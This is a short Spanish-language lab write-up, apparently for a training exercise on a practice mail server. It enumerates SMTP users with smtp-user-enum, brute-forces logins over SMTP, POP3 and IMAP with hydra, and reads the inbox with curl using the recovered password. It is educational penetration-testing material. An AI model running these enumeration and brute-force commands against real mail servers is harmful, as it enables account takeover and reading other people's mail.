# Common services - mail

## What is the available username for the domain inlanefreight.htb in the SMTP server?

- Añadimos el dominio en `/etc/hosts`

- Nos dan una lista de usuarios, `users.list`, que nos sirve para hacer fuerza bruta

	```bash
	smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t $target
	```

	Encontrando como correo válido `marlin@inlanefreight.htb`

## Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.

- Encontraríamos la pass en cualquier protocolo (imap, pop3 ó smtp)

	```bash
	hydra -l 'marlen@inlanefreight.htb' -P pws.list smtp://$target
	hydra -l 'marlen@inlanefreight.htb' -P pws.list pop3://$target
 	hydra -l 'marlen' -P pws.list imap://$target
	```

	La pass es `poohbear`

- Nos conectamos por `imap` utilizando `curl` del siguiente modo 

	```bash
	 curl --user marlin@inlanefreight.htb:poohbear "imap://$target"
	 # Encontramos la carpeta INBOX, aunque el comando que se muestra a continuación no muestra más información
	 curl --user marlin@inlanefreight.htb:poohbear "imap://$target/INBOX"
	 # El siguiente comando trataría de mostrar todos los correos disponibles
	 curl --user marlin@inlanefreight.htb:poohbear "imap://$target/INBOX;UID=1:*"
	```